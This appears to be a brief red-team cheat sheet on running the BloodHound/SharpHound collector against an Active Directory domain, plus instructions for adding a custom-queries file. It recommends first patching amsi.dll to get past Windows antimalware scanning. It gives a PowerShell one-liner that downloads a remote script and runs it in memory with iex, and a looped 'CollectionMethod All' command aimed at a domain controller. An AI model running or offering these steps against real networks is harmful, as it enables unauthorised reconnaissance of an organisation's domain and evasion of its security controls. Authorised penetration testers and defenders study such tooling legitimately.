# Invoke-BloodHound
> **Warning**
> It is recommended to [patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse) first.

```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
Invoke-BloodHound -Domain <domain> -DomainController <ip> -CollectionMethod All -Loop -LoopInterval 00:05:00 -LoopDuration 04:00:00
```

# Bloodhound CustomQueries
[A collection of custom](https://github.com/okazymyrov/piki/blob/master/customqueries.json) queries for BloodHound based on [Bloodhound-CustomQueries](https://github.com/ZephrFish/Bloodhound-CustomQueries) from 08.07.22.
## How to 
Add the [customqueries.json](https://github.com/okazymyrov/piki/blob/master/customqueries.json) file to `C:\Users\<INSERT USER>\AppData\Roaming\bloodhound\customqueries.json` on Windows or `~/.config/bloodhound/customqueries.json` on Linux/Mac.
